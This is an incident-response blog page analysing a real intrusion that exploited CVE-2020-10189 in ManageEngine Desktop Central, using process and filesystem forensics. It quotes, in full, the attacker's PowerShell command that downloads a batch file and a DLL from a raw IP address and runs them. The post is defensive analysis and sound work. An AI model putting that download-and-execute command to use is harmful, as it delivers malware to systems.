<!doctype html><html lang="en"><head>
    <meta charset="utf-8">
    <title>Analysis Of Exploitation: CVE-2020-10189</title>
    <link rel="shortcut icon" href="https://blog.reconinfosec.com/hubfs/recon-shield-on-white.png">
    <meta name="description" content="The Recon incident response team recently worked an intrusion case involving a ManageEngine Desktop Central server that was affected by CVE-2020-10189.">
    
    
    
      
    
    
    
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="The Recon incident response team recently worked an intrusion case involving a ManageEngine Desktop Central server that was affected by CVE-2020-10189.">
    <meta property="og:title" content="Analysis Of Exploitation: CVE-2020-10189">
    <meta name="twitter:description" content="The Recon incident response team recently worked an intrusion case involving a ManageEngine Desktop Central server that was affected by CVE-2020-10189.">
    <meta name="twitter:title" content="Analysis Of Exploitation: CVE-2020-10189">

    

    
  <script id="hs-search-input__valid-content-types" type="application/json">
    [
      
        "SITE_PAGE",
      
        "LANDING_PAGE",
      
        "BLOG_POST",
      
        "LISTING_PAGE",
      
        "KNOWLEDGE_ARTICLE",
      
        "HS_CASE_STUDY"
      
    ]
  </script>

    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'â€º';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://blog.reconinfosec.com/hs-fs/hub/7101814/hub_generated/template_assets/131712963159/1692990332520/Recon_-_Freehive_Theme/css/main.min.css">
<link rel="stylesheet" href="https://blog.reconinfosec.com/hs-fs/hub/7101814/hub_generated/template_assets/131712521912/1692990323540/Recon_-_Freehive_Theme/css/templates/blog.min.css">
<link rel="stylesheet" href="https://blog.reconinfosec.com/hs-fs/hub/7101814/hub_generated/template_assets/131712521996/1692990325621/Recon_-_Freehive_Theme/css/theme-overrides.min.css">
<link rel="stylesheet" href="https://7052064.fs1.hubspotusercontent-na1.net/hubfs/7052064/hub_generated/module_assets/1/-2712622/1741803613777/module_search_input.min.css">
<link rel="stylesheet" href="https://blog.reconinfosec.com/hs-fs/hub/7101814/hub_generated/module_assets/131712522012/1692983522878/module_131712522012_menu.min.css">

  <style>
    #hs_cos_wrapper_navigation-primary .menu .menu__submenu {}

@media (min-width:767px) {
  #hs_cos_wrapper_navigation-primary .menu__submenu--level-2>.menu__item:first-child:before {}
}

#hs_cos_wrapper_navigation-primary .menu__submenu .menu__link,
#hs_cos_wrapper_navigation-primary .menu__submenu .menu__link:hover,
#hs_cos_wrapper_navigation-primary .menu__submenu .menu__link:focus {}

#hs_cos_wrapper_navigation-primary .menu__submenu .menu__child-toggle-icon,
#hs_cos_wrapper_navigation-primary .menu__submenu .menu__child-toggle-icon:hover,
#hs_cos_wrapper_navigation-primary .menu__submenu .menu__child-toggle-icon:focus {}

  </style>

<link rel="stylesheet" href="https://blog.reconinfosec.com/hs-fs/hub/7101814/hub_generated/module_assets/26182622026/1582324586684/module_26182622026_Pillar_Page_Link.min.css">
<style>
  @font-face {
    font-family: "Raleway";
    font-weight: 900;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Raleway/900.woff2") format("woff2"), url("/_hcms/googlefonts/Raleway/900.woff") format("woff");
  }
  @font-face {
    font-family: "Raleway";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Raleway/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Raleway/regular.woff") format("woff");
  }
  @font-face {
    font-family: "Open Sans";
    font-weight: 500;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Open_Sans/500.woff2") format("woff2"), url("/_hcms/googlefonts/Open_Sans/500.woff") format("woff");
  }
  @font-face {
    font-family: "Open Sans";
    font-weight: 600;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Open_Sans/600.woff2") format("woff2"), url("/_hcms/googlefonts/Open_Sans/600.woff") format("woff");
  }
  @font-face {
    font-family: "Open Sans";
    font-weight: 400;
    font-style: normal;
    font-display: swap;
    src: url("/_hcms/googlefonts/Open_Sans/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Open_Sans/regular.woff") format("woff");
  }
</style>

<!-- Editor Styles -->
<style id="hs_editor_style" type="text/css">
/* HubSpot Styles (default) */
.footer-column-1-row-2-margin {
  margin-top: 12px !important;
  margin-bottom: 12px !important;
}
</style>
    

    
<!--  Added by GoogleAnalytics integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
_hsp.push(['addPrivacyConsentListener', function(consent) { if (consent.allowed || (consent.categories && consent.categories.analytics)) {
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create','UA-86110655-9','auto');
  ga('send','pageview');
}}]);
</script>

<!-- /Added by GoogleAnalytics integration -->

<!--  Added by GoogleAnalytics4 integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;


if (!window._hsGoogleConsentRunOnce) {
  window._hsGoogleConsentRunOnce = true;

  gtag('consent', 'default', {
    'ad_storage': 'denied',
    'analytics_storage': 'denied',
    'ad_user_data': 'denied',
    'ad_personalization': 'denied',
    'wait_for_update': waitForUpdateMillis
  });

  if (useGoogleConsentModeV2) {
    _hsp.push(['useGoogleConsentModeV2'])
  } else {
    _hsp.push(['addPrivacyConsentListener', function(consent){
      var hasAnalyticsConsent = consent && (consent.allowed || (consent.categories && consent.categories.analytics));
      var hasAdsConsent = consent && (consent.allowed || (consent.categories && consent.categories.advertisement));

      gtag('consent', 'update', {
        'ad_storage': hasAdsConsent ? 'granted' : 'denied',
        'analytics_storage': hasAnalyticsConsent ? 'granted' : 'denied',
        'ad_user_data': hasAdsConsent ? 'granted' : 'denied',
        'ad_personalization': hasAdsConsent ? 'granted' : 'denied'
      });
    }]);
  }
}

gtag('js', new Date());
gtag('set', 'developer_id.dZTQ1Zm', true);
gtag('config', 'G-7T6KYXD30V');
</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-7T6KYXD30V"></script>

<!-- /Added by GoogleAnalytics4 integration -->



<link rel="amphtml" href="https://blog.reconinfosec.com/analysis-of-exploitation-cve-2020-10189?hs_amp=true">

<meta property="og:url" content="https://blog.reconinfosec.com/analysis-of-exploitation-cve-2020-10189">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://blog.reconinfosec.com/analysis-of-exploitation-cve-2020-10189">
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-86110655-9"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-86110655-9');
</script>
<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://blog.reconinfosec.com/rss.xml">
<meta name="twitter:domain" content="blog.reconinfosec.com">
<meta name="twitter:site" content="@Recon_InfoSec">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">






  <meta name="generator" content="HubSpot"></head>
  <body>
    <div class="body-wrapper   hs-content-id-64795589556 hs-blog-post hs-blog-id-26182611321">
      
        <div data-global-resource-path="Recon - Freehive Theme/templates/partials/header.html">
<header class="header">

  

  <a href="#main-content" class="header__skip">Skip to content</a>

  

  <div class="container-fluid content-wrapper">
<div class="row-fluid-wrapper">
<div class="row-fluid">
<div class="span12 widget-span widget-type-cell " style="" data-widget-type="cell" data-x="0" data-w="12">

</div><!--end widget-span -->
</div>
</div>
</div>

  

  <div class="header__container content-wrapper">

    

    <div class="header__logo header__logo--main">
      <div id="hs_cos_wrapper_site_logo" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-logo" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
  





  <span id="hs_cos_wrapper_site_logo_hs_logo_widget" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_logo" style="" data-hs-cos-general-type="widget" data-hs-cos-type="logo"><a href="//blog.reconinfosec.com/" id="hs-link-site_logo_hs_logo_widget" style="border-width:0px;border:0px;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/recon-logo-full-on-white.png?width=7680&amp;height=2304&amp;name=recon-logo-full-on-white.png" class="hs-image-widget " height="2304" style="height: auto;width:7680px;border-width:0px;border:0px;" width="7680" alt="recon_infosec.png" title="recon_infosec.png" loading="eager" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/recon-logo-full-on-white.png?width=3840&amp;height=1152&amp;name=recon-logo-full-on-white.png 3840w, https://blog.reconinfosec.com/hs-fs/hubfs/recon-logo-full-on-white.png?width=7680&amp;height=2304&amp;name=recon-logo-full-on-white.png 7680w, https://blog.reconinfosec.com/hs-fs/hubfs/recon-logo-full-on-white.png?width=11520&amp;height=3456&amp;name=recon-logo-full-on-white.png 11520w, https://blog.reconinfosec.com/hs-fs/hubfs/recon-logo-full-on-white.png?width=15360&amp;height=4608&amp;name=recon-logo-full-on-white.png 15360w, https://blog.reconinfosec.com/hs-fs/hubfs/recon-logo-full-on-white.png?width=19200&amp;height=5760&amp;name=recon-logo-full-on-white.png 19200w, https://blog.reconinfosec.com/hs-fs/hubfs/recon-logo-full-on-white.png?width=23040&amp;height=6912&amp;name=recon-logo-full-on-white.png 23040w" sizes="(max-width: 7680px) 100vw, 7680px"></a></span>
</div>
    </div>

    

    <div class="header__column">

      



      <div class="header__row-1">
        
        <div class="header__search header--element">
          <div id="hs_cos_wrapper_site_search" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">




  








<div class="hs-search-field">

    <div class="hs-search-field__bar">
      <form data-hs-do-not-collect="true" action="/hs-search-results">
        
        <input type="text" class="hs-search-field__input" name="term" autocomplete="off" aria-label="Search" placeholder="">

        
          
        
          
        
          
            <input type="hidden" name="type" value="BLOG_POST">
          
        
          
        
          
        
          
        

        
      </form>
    </div>
    <ul class="hs-search-field__suggestions"></ul>
</div></div>
        </div>
      </div>

      

      <div class="header__row-2">
        <div class="header--toggle header__navigation--toggle"></div>
        
        <div class="header--toggle header__search--toggle"></div>
        <div class="header__close--toggle"></div>
        <div class="header__navigation header--element">
          <div id="hs_cos_wrapper_navigation-primary" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">









<nav class="menu menu--desktop" aria-label="Main menu">
  <ul class="menu__wrapper no-list">
    

  

  

  
    
    <li class="menu__item menu__item--depth-1  hs-skip-lang-url-rewrite">
      
        <a class="menu__link   " href="https://www.reconinfosec.com/">Website Home</a>
      
      
    </li>
  
  


  </ul>
</nav>



<nav class="menu menu--mobile" aria-label="Main menu">
  <ul class="menu__wrapper no-list">
    

  

  

  
    
    <li class="menu__item menu__item--depth-1  hs-skip-lang-url-rewrite">
      
        <a class="menu__link   " href="https://www.reconinfosec.com/">Website Home</a>
      
      
    </li>
  
  


  </ul>
</nav></div>
        </div>
      </div>

    </div>

  </div>

  

  <div class="container-fluid content-wrapper">
<div class="row-fluid-wrapper">
<div class="row-fluid">
<div class="span12 widget-span widget-type-cell " style="" data-widget-type="cell" data-x="0" data-w="12">

</div><!--end widget-span -->
</div>
</div>
</div>

</header></div>
      

      

      <main id="main-content" class="body-container-wrapper">
        
<div class="body-container body-container--blog-post">

  

  <div class="content-wrapper">
    <article class="blog-post">
      <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Analysis Of Exploitation: CVE-2020-10189</span></h1>
      <div class="blog-post__meta">
        <a href="https://blog.reconinfosec.com/author/luke-rusten" rel="author">
          Luke Rusten
        </a>
        <!--<time datetime="2020-03-25 18:39:00" class="blog-post__timestamp">
          Mar 25, 2020 1:39:00 PM
        </time>-->
      </div>
      <div class="blog-post__body">
        <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>The Recon incident response team recently worked an intrusion case involving a ManageEngine Desktop Central server that was affected by CVE-2020-10189.</p>
<!--more-->
<blockquote><em>Zoho ManageEngine Desktop Central 10 allows remote code execution because of deserialization of untrusted data in getChartImage in the FileStorage class. This is related to the CewolfServlet and MDMLogUploaderServlet servlets.</em></blockquote>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10189#vulnCurrentDescriptionTitle" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2020-10189#vulnCurrentDescriptionTitle</a></p>
<h2 id="remote-code-execution-vulnerability-disclosed-on-twitter">Remote Code Execution vulnerability disclosed on Twitter</h2>
<p>During our research of Desktop Central vulnerabilities we located a post on Twitter from a researcher who had disclosed an RCE for Desktop Central on March 5, 2020 (Figure 1).</p>
<div><iframe id="twitter-widget-0" style="margin: 0px auto; display: block;" title="Twitter Tweet" xml="lang" src="https://platform.twitter.com/embed/Tweet.html?creatorScreenName=lukerecon&amp;dnt=false&amp;embedId=twitter-widget-0&amp;features=eyJ0ZndfZXhwZXJpbWVudHNfY29va2llX2V4cGlyYXRpb24iOnsiYnVja2V0IjoxMjA5NjAwLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X2hvcml6b25fdHdlZXRfZW1iZWRfOTU1NSI6eyJidWNrZXQiOiJodGUiLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X3NwYWNlX2NhcmQiOnsiYnVja2V0Ijoib2ZmIiwidmVyc2lvbiI6bnVsbH19&amp;frame=false&amp;hideCard=false&amp;hideThread=false&amp;id=1235635108498948096&amp;lang=en&amp;origin=https%3A%2F%2Fblog.reconinfosec.com%2Fanalysis-of-exploitation-cve-2020-10189%2F&amp;sessionId=dab2aeb3def45b99735eba7b02e02667984849a3&amp;siteScreenName=Recon_InfoSec&amp;theme=light&amp;widgetsVersion=75b3351%3A1642573356397&amp;width=550px" width="560" height="315" frameborder="0" scrolling="no" allowfullscreen data-tweet-id="1235635108498948096"></iframe></div>
<center><strong>Figure 1</strong> - Vulnerability disclosed on Twitter</center>
<p><br>Research on CVE-2020-10189 also showed that vulnerable Desktop Central servers were searchable on<span>&nbsp;</span><a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a>, a popular search engine for Internet-connected devices often used by attackers looking for vulnerable targets (Figure 2).</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/shodan.png?width=449&amp;name=shodan.png" alt="shodan" width="449" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 449px;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/shodan.png?width=225&amp;name=shodan.png 225w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/shodan.png?width=449&amp;name=shodan.png 449w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/shodan.png?width=674&amp;name=shodan.png 674w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/shodan.png?width=898&amp;name=shodan.png 898w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/shodan.png?width=1123&amp;name=shodan.png 1123w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/shodan.png?width=1347&amp;name=shodan.png 1347w" sizes="(max-width: 449px) 100vw, 449px">
<figcaption><strong>Figure 2</strong> - Vulnerable Desktop Central servers searchable on Shodan</figcaption>
</figure>
<p><br>Initial compromise was determined based on a suspicious PowerShell download cradle that contained instructions to download files from a dotted quad url.<br><br>One of the earliest activities carried out by the actor are a few suspicious PowerShell download commands. &nbsp;The commands contained instructions to download<span>&nbsp;</span><code>install.bat</code><span>&nbsp;</span>and<span>&nbsp;</span><code>storesyncsvc.dll</code><span>&nbsp;</span>to<span>&nbsp;</span><code>C:\Windows\Temp</code><span>&nbsp;</span>and then immediately execute<span>&nbsp;</span><code>install.bat</code><span>&nbsp;</span>(figure 3).</p>
<pre class="line-numbers"><code class="language-shell">cmd /c powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98.220:12345/test/install.bat','C:\Windows\Temp\install.bat')&amp;powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98.220:12345/test/storesyncsvc.dll','C:\Windows\Temp\storesyncsvc.dll')&amp;C:\Windows\Temp\install.bat
</code></pre>
<div>&nbsp;</div>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/powershell-download.png?width=610&amp;name=powershell-download.png" alt="powershell-download" width="610" loading="lazy" style="width: 610px; margin-left: auto; margin-right: auto; display: block;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/powershell-download.png?width=305&amp;name=powershell-download.png 305w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/powershell-download.png?width=610&amp;name=powershell-download.png 610w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/powershell-download.png?width=915&amp;name=powershell-download.png 915w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/powershell-download.png?width=1220&amp;name=powershell-download.png 1220w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/powershell-download.png?width=1525&amp;name=powershell-download.png 1525w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/powershell-download.png?width=1830&amp;name=powershell-download.png 1830w" sizes="(max-width: 610px) 100vw, 610px">
<figcaption><strong>Figure 3</strong> - Suspicious PowerShell download commands</figcaption>
</figure>
<p>The<span>&nbsp;</span><code>install.bat</code><span>&nbsp;</span>script contained instructions to install<span>&nbsp;</span><code>storesyncsvc.dll</code><span>&nbsp;</span>as a service on the system. (Figure 4).</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/installbat.png?width=631&amp;name=installbat.png" alt="installbat" width="631" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 631px;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/installbat.png?width=316&amp;name=installbat.png 316w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/installbat.png?width=631&amp;name=installbat.png 631w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/installbat.png?width=947&amp;name=installbat.png 947w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/installbat.png?width=1262&amp;name=installbat.png 1262w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/installbat.png?width=1578&amp;name=installbat.png 1578w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/installbat.png?width=1893&amp;name=installbat.png 1893w" sizes="(max-width: 631px) 100vw, 631px">
<figcaption><strong>Figure 4</strong> - Install.bat contents</figcaption>
</figure>
<p><br>Predictably, within seconds of the suspicious PowerShell commands being run, we observed the installation of a new service with the Service Name<span>&nbsp;</span><code>StorSyncSvc</code><span>&nbsp;</span>and Display Name of<span>&nbsp;</span><code>Storage Sync Service</code><span>&nbsp;</span>(Figure 5).</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/svcinstall-event2.png?width=509&amp;name=svcinstall-event2.png" alt="svcinstall-event2" width="509" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 509px;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/svcinstall-event2.png?width=255&amp;name=svcinstall-event2.png 255w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/svcinstall-event2.png?width=509&amp;name=svcinstall-event2.png 509w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/svcinstall-event2.png?width=764&amp;name=svcinstall-event2.png 764w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/svcinstall-event2.png?width=1018&amp;name=svcinstall-event2.png 1018w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/svcinstall-event2.png?width=1273&amp;name=svcinstall-event2.png 1273w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/svcinstall-event2.png?width=1527&amp;name=svcinstall-event2.png 1527w" sizes="(max-width: 509px) 100vw, 509px">
<figcaption style="padding-left: 80px;"><strong>Figure 5</strong> - Storage Sync Service install</figcaption>
</figure>
<p><br>OSINT quickly confirmed<span>&nbsp;</span><code>storesyncsvc.dll</code><span>&nbsp;</span>to be previously observed by others hit by this campaign. VirusTotal results indicated that several detection engines had already classified<span>&nbsp;</span><code>storesyncsvc.dll</code><span>&nbsp;</span>as malware.</p>
<p><a href="https://www.virustotal.com/gui/file/f91f2a7e1944734371562f18b066f193605e07223aab90bd1e8925e23bbeaa1c/details" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/f91f2a7e1944734371562f18b066f193605e07223aab90bd1e8925e23bbeaa1c/details</a></p>
<h2 id="leveraging-process-tracking-to-identify-application-exploitation">Leveraging Process Tracking to Identify Application Exploitation</h2>
<p>Knowing that an RCE had been disclosed via Twitter on March 5, 2020, only a few days prior to this intrusion, we already had a strong theory on the attack vector being exploitation of the Zoho ManageEngine Desktop Central application.</p>
<p>Review of Sysmon process creation events indicated that<span>&nbsp;</span><code>C:\ManageEngine\DesktopCentral_Server\jre\bin\java.exe</code><span>&nbsp;</span>was the process responsible for executing the PowerShell Download commands (Figure 6).</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/commandparent.png?width=609&amp;name=commandparent.png" alt="commandparent" width="609" loading="lazy" style="width: 609px; margin-left: auto; margin-right: auto; display: block;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/commandparent.png?width=305&amp;name=commandparent.png 305w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/commandparent.png?width=609&amp;name=commandparent.png 609w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/commandparent.png?width=914&amp;name=commandparent.png 914w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/commandparent.png?width=1218&amp;name=commandparent.png 1218w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/commandparent.png?width=1523&amp;name=commandparent.png 1523w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/commandparent.png?width=1827&amp;name=commandparent.png 1827w" sizes="(max-width: 609px) 100vw, 609px">
<figcaption><strong>Figure 6</strong> - ParentImage responsible for PowerShell download</figcaption>
</figure>
<p><br>Looking at processes in memory, we also observed the parent/child relationship between the Desktop Central<span>&nbsp;</span><code>java.exe</code><span>&nbsp;</span>application,<span>&nbsp;</span><code>cmd.exe</code><span>&nbsp;</span>and<span>&nbsp;</span><code>2.exe</code><span>&nbsp;</span>(Figure 7).</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/pstree-results.png?width=631&amp;name=pstree-results.png" alt="pstree-results" width="631" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 631px;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/pstree-results.png?width=316&amp;name=pstree-results.png 316w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/pstree-results.png?width=631&amp;name=pstree-results.png 631w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/pstree-results.png?width=947&amp;name=pstree-results.png 947w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/pstree-results.png?width=1262&amp;name=pstree-results.png 1262w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/pstree-results.png?width=1578&amp;name=pstree-results.png 1578w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/pstree-results.png?width=1893&amp;name=pstree-results.png 1893w" sizes="(max-width: 631px) 100vw, 631px">
<figcaption><strong>Figure 7</strong> -<span>&nbsp;</span><code>java.exe</code><span>&nbsp;</span>parent/child process relationships</figcaption>
</figure>
<h2 id="leveraging-filesystem-artifacts-to-identify-application-exploitation">Leveraging Filesystem Artifacts to Identify Application Exploitation</h2>
<p>To further validate our theory, we compared the artifacts that had been collected from the affected Desktop Central server to the POC that had been published and determined that the attacker had likely leveraged the CVE-2020-10189 vulnerability to run code on this vulnerable system.</p>
<p>Through filesystem timeline analysis we determined that a traversal file write had likely occurred on the system with the file names &nbsp;<code>_chart</code><span>&nbsp;</span>(Figure 8) and<span>&nbsp;</span><code>logger.zip</code><span>&nbsp;</span>(Figure 9). &nbsp;</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-forensics.png?width=566&amp;name=chart-forensics.png" alt="chart-forensics" width="566" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 566px;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-forensics.png?width=283&amp;name=chart-forensics.png 283w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-forensics.png?width=566&amp;name=chart-forensics.png 566w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-forensics.png?width=849&amp;name=chart-forensics.png 849w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-forensics.png?width=1132&amp;name=chart-forensics.png 1132w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-forensics.png?width=1415&amp;name=chart-forensics.png 1415w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-forensics.png?width=1698&amp;name=chart-forensics.png 1698w" sizes="(max-width: 566px) 100vw, 566px">
<figcaption><strong>Figure 8</strong> - File system analysis<span>&nbsp;</span><code>_chart</code></figcaption>
</figure>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/loggerzip.png?width=576&amp;name=loggerzip.png" alt="loggerzip" width="576" loading="lazy" style="margin-left: auto; margin-right: auto; display: block; width: 576px;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/loggerzip.png?width=288&amp;name=loggerzip.png 288w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/loggerzip.png?width=576&amp;name=loggerzip.png 576w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/loggerzip.png?width=864&amp;name=loggerzip.png 864w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/loggerzip.png?width=1152&amp;name=loggerzip.png 1152w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/loggerzip.png?width=1440&amp;name=loggerzip.png 1440w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/loggerzip.png?width=1728&amp;name=loggerzip.png 1728w" sizes="(max-width: 576px) 100vw, 576px">
<figcaption><strong>Figure 9</strong> - File system analysis<span>&nbsp;</span><code>logger.zip</code></figcaption>
</figure>
<p><br>These file names were also referenced in the POC that had been released by<span>&nbsp;</span><a href="https://twitter.com/steventseeley" target="_blank" rel="noopener">@Steventseeley</a><span>&nbsp;</span>(Figure 10).</p>
<figure style="text-align: center;"><img src="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-logger-zip.png?width=535&amp;name=chart-logger-zip.png" alt="chart-logger-zip" width="535" loading="lazy" style="width: 535px; margin-left: auto; margin-right: auto; display: block;" srcset="https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-logger-zip.png?width=268&amp;name=chart-logger-zip.png 268w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-logger-zip.png?width=535&amp;name=chart-logger-zip.png 535w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-logger-zip.png?width=803&amp;name=chart-logger-zip.png 803w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-logger-zip.png?width=1070&amp;name=chart-logger-zip.png 1070w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-logger-zip.png?width=1338&amp;name=chart-logger-zip.png 1338w, https://blog.reconinfosec.com/hs-fs/hubfs/Imported%20sitepage%20images/chart-logger-zip.png?width=1605&amp;name=chart-logger-zip.png 1605w" sizes="(max-width: 535px) 100vw, 535px">
